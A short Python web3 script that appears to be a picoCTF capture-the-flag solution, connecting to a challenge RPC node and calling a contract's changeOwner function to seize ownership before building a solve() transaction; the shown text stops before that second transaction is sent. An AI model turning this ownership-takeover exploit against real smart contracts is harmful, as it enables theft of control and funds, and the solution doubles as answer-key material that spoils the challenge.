from web3 import Web3

rpc = "http://lonely-island.picoctf.net:55881"
w3 = Web3(Web3.HTTPProvider(rpc))

private_key = "YOUR_PRIVATE_KEY"
acct = w3.eth.account.from_key(private_key)

contract = w3.eth.contract(
    address="0x6D8da4B12D658a36909ec1C75F81E54B8DB4eBf9",
    abi=ABI
)

# 1 become owner
tx = contract.functions.changeOwner(acct.address).build_transaction({
    "from": acct.address,
    "nonce": w3.eth.get_transaction_count(acct.address),
    "gas": 200000,
    "gasPrice": w3.to_wei("1", "gwei")
})

signed = acct.sign_transaction(tx)
w3.eth.send_raw_transaction(signed.rawTransaction)

# 2 solve
tx = contract.functions.solve().build_transaction({
    "from": acct.address,
    "nonce": w3.eth.get_transaction_count(acct.address),
    "gas": 200000,
    "gasPrice": w3.to_wei("1", "gwei")
})